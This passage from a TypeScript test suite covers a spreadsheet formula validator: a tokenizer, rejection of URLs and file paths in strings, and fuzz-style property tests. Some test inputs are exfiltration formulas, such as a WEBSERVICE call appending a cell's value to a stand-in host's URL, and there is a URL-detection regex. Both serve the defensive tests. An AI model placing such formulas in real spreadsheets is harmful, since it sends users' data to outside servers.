    rejected("=Orders[[[Amount]]]", ["G-PARSE"], withTable);
    rejected("=Orders[Am#ount]", ["G-PARSE"], withTable);
    rejected("=Orders[a']&WEBSERVICE(A2)&Orders[b]]", [], withTable);
  });
});

describe("G-URL", () => {
  it("rejects web and file addresses in any string literal", () => {
    for (const f of [
      '=A2&"https://x.test"',
      '=A2&"HTTP://X.TEST"',
      '=A2&"ftp://x.test"',
      '=A2&"file:///c:/x"',
      '=A2&"\\\\server\\share"',
      '={"http:x"}',
      '=IF(A2="a","b","see https://x")',
    ]) {
      rejected(f, ["G-URL"]);
    }
  });

  it("allows strings that only look similar", () => {
    allowed('=IF(A2="http","y","n")');
    allowed('=SUBSTITUTE(A2,"\\","/")');
  });

  it("never puts string contents in the detail", () => {
    const r = rejected('=A2&"https://private-value.test"');
    for (const reason of r.reasons) expect(reason.detail).not.toContain("private-value");
  });
});

describe("tokenize", () => {
  const types = (f: string) => tokenize(f).map((t) => t.type);
  const texts = (f: string) => tokenize(f).map((t) => t.text);

  it("splits a call with a range", () => {
    expect(types("=SUM(A1:B2)")).toEqual(["op", "func", "paren", "ref", "paren"]);
    expect(texts("=SUM(A1:B2)")).toEqual(["=", "SUM", "(", "A1:B2", ")"]);
  });

  it("reads string literals with doubled quotes", () => {
    const [, s] = tokenize('="a""b"');
    expect(s).toMatchObject({ type: "string", text: '"a""b"', value: 'a"b', start: 1, end: 7 });
  });

  it("reads quoted and unquoted sheet names", () => {
    expect(tokenize("='My Sheet'!A1")[1]).toMatchObject({ type: "ref", text: "'My Sheet'!A1" });
    expect(tokenize("='It''s'!$A$1:$B$2")[1]).toMatchObject({ type: "ref", text: "'It''s'!$A$1:$B$2" });
    expect(tokenize("=Regions!A2")[1]).toMatchObject({ type: "ref", text: "Regions!A2" });
    expect(tokenize("=Regions!A:A")[1]).toMatchObject({ type: "ref", text: "Regions!A:A" });
  });

  it("reads structured references as one token", () => {
    for (const s of ["Orders[Amount]", "Orders[@Amount]", "Orders[[#This Row],[Amount]]", "Orders[#All]", "Orders[]"]) {
      const rest = tokenize(`=${s}`).slice(1);
      expect(rest).toHaveLength(1);
      expect(rest[0]).toMatchObject({ type: "struct", text: s, start: 1, end: 1 + s.length });
    }
  });

  it("reads array constants", () => {
    expect(types("={1,2;3,4}")).toEqual(["op", "array", "number", "sep", "number", "sep", "number", "sep", "number", "array"]);
  });

  it("reads operators", () => {
    expect(texts("=A1<=B1<>C1>=D1+1-2*3/4^5&6%=7<8>9")).toEqual([
      "=", "A1", "<=", "B1", "<>", "C1", ">=", "D1", "+", "1", "-", "2", "*", "3", "/", "4", "^", "5", "&", "6", "%", "=", "7", "<", "8", ">", "9",
    ]);
  });

  it("reads spill, implicit intersection, numbers, dotted and prefixed names", () => {
    expect(tokenize("=A2#")[1]).toMatchObject({ type: "ref", text: "A2#" });
    expect(types("=@A2:A10")).toEqual(["op", "op", "ref"]);
    expect(tokenize("=1.5E+3")[1]).toMatchObject({ type: "number", text: "1.5E+3" });
    expect(texts("=50%")).toEqual(["=", "50", "%"]);
    expect(tokenize("=CEILING.MATH(A2)")[1]).toMatchObject({ type: "func", text: "CEILING.MATH" });
    expect(tokenize("=_xlfn._xlws.SORT(A2:A9)")[1]).toMatchObject({ type: "func", text: "_xlfn._xlws.SORT" });
    expect(types("=1:1")).toEqual(["op", "ref"]);
    expect(types("=A:A")).toEqual(["op", "ref"]);
    expect(types("=LOG10")).toEqual(["op", "ref"]);
    expect(types("=LOG10(2)")).toEqual(["op", "func", "paren", "number", "paren"]);
    expect(types("=Foo")).toEqual(["op", "name"]);
    expect(types("=true")).toEqual(["op", "bool"]);
    expect(types("= SUM (A1)")).toEqual(["op", "ws", "func", "ws", "paren", "ref", "paren"]);
  });

  it("reads error literals", () => {
    for (const e of ["#N/A", "#DIV/0!", "#VALUE!", "#REF!", "#NAME?", "#NUM!", "#NULL!", "#SPILL!", "#CALC!", "#GETTING_DATA"]) {
      expect(tokenize(`=${e}`)[1], e).toMatchObject({ type: "error", text: e });
    }
  });

  it("covers the whole formula with contiguous offsets", () => {
    const f = "= SUM( 'My Sheet'!A1:B2 , Orders[@Amount], \"x\"\"y\", {1;2} )*-3%";
    const toks = tokenize(f);
    let pos = 0;
    for (const t of toks) {
      expect(t.start).toBe(pos);
      expect(f.slice(t.start, t.end)).toBe(t.text);
      pos = t.end;
    }
    expect(pos).toBe(f.length);
  });
});

describe("details", () => {
  it("are plain sentences", () => {
    const samples = [
      '=WEBSERVICE("https://x.test/?d="&A2)',
      "=SUM(Z1:Z5000)",
      "=SecretName",
      '="abc',
      "=SUM('[Book2.xlsx]Sheet1'!A1:A9)",
      "=Other[Amount]",
      "=LET(sum,1,sum)",
      "=SUM(1:1)",
    ];
    for (const f of samples) {
      for (const r of check(f, base).reasons) {
        expect(r.detail).toMatch(/^[A-Z].*[.]$/);
        expect(r.detail).not.toMatch(/encrypt|secure|compliant|anonymous/i);
      }
    }
    expect(check('="abc', base).reasons[0]?.detail.startsWith("Couldn't read this formula.")).toBe(true);
  });

  it("dedupes repeated reasons", () => {
    const r = check("=WEBSERVICE(A2)&WEBSERVICE(B2)", base);
    expect(r.reasons).toHaveLength(1);
  });
});

// Deterministic PRNG so failures reproduce.
function rng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const CODES: GateCode[] = ["G-START", "G-LEN", "G-FUNC", "G-NAME", "G-EXT", "G-REF", "G-URL", "G-PARSE"];
const URL_RE = /https?:|ftp:|file:|\\\\/i;

function assertSane(f: string, r: GateResult): void {
  expect(typeof r.ok).toBe("boolean");
  expect(Array.isArray(r.reasons)).toBe(true);
  if (r.ok) {
    expect(r.reasons).toEqual([]);
    expect(f.startsWith("=")).toBe(true);
    expect(f.length).toBeLessThanOrEqual(2000);
    const toks = tokenize(f);
    for (const t of toks) {
      if (t.type === "func") expect(EXCLUDED).not.toContain(normalizeFunctionName(t.text));
      if (t.type === "string") expect(t.value ?? "").not.toMatch(URL_RE);
    }
  } else {
    expect(r.reasons.length).toBeGreaterThan(0);
    for (const reason of r.reasons) {
      expect(CODES).toContain(reason.code);
      expect(typeof reason.detail).toBe("string");
    }
  }
}

describe("property: check never throws", () => {
  it("returns a GateResult for random strings", () => {
    const next = rng(20260924);
    const alphabet = `=+-*/^&<>%:@#$!'"()[]{},;. \n\tABCDEFXYZabcxyz0123456789_\\|~\u0406\u00A0\u200B\u017F`;
    for (let n = 0; n < 3000; n++) {
      const len = Math.floor(next() * 40);
      let f = next() < 0.8 ? "=" : "";
      for (let i = 0; i < len; i++) f += alphabet[Math.floor(next() * alphabet.length)]!;
      let r: GateResult | undefined;
      expect(() => (r = check(f, withTable)), f).not.toThrow();
      assertSane(f, r!);
    }
  });

  it("returns a GateResult for random token soups", () => {
    const next = rng(7);
    const parts = [
      "SUM(", "sum (", "LET(", "LAMBDA(", "x", "v", ",", ")", "(", "A2", "$B$3", "E2:E501", "A:A", "1:1", "Z9",
      "Orders[Amount]", "Orders[@Amount]", "[#All]", "[", "]", "Regions!", "'My Sheet'!", "[1]", "Book2.xlsx!",
      '"https://x"', '"a""b"', '"', "'", "{", "}", ";", "#", "#N/A", "@", "&", "+", "-", "*", "/", "^", "%", ":",
      "<>", "<=", "=", " ", "\n", "WEBSERVICE(", "_xlfn.", "IMAGE(", "INDIRECT(", "SecretName", "TRUE", "1.5E+3",
      "A2#", "INDEX(", "MAP(", "f(", "PERSON_001", "\u0406", ".", "!", "$",
    ];
    for (let n = 0; n < 5000; n++) {
      const len = 1 + Math.floor(next() * 14);
      let f = next() < 0.9 ? "=" : "";
      for (let i = 0; i < len; i++) f += parts[Math.floor(next() * parts.length)]!;
      let r: GateResult | undefined;
      expect(() => (r = check(f, withTable)), f).not.toThrow();
      assertSane(f, r!);
    }
  });

  it("tokenize either throws FormulaParseError or covers the input exactly", () => {
    const next = rng(424242);
    const alphabet = `=+-*/^&<>%:@#$!'"()[]{},;. \nAEFZaz019_Іé`;
    for (let n = 0; n < 5000; n++) {
      const len = Math.floor(next() * 30);
      let f = "=";
      for (let i = 0; i < len; i++) f += alphabet[Math.floor(next() * alphabet.length)]!;
      let toks;
      try {
        toks = tokenize(f);
      } catch (e) {
        expect(e, f).toBeInstanceOf(FormulaParseError);
        continue;
      }
      expect(toks.map((t) => t.text).join(""), f).toBe(f);
      for (const t of toks) expect(f.slice(t.start, t.end)).toBe(t.text);
    }
  });

  it("returns a GateResult for non-string input", () => {
    expect(check(undefined as unknown as string, base).ok).toBe(false);
    expect(check(42 as unknown as string, base).ok).toBe(false);
  });
});
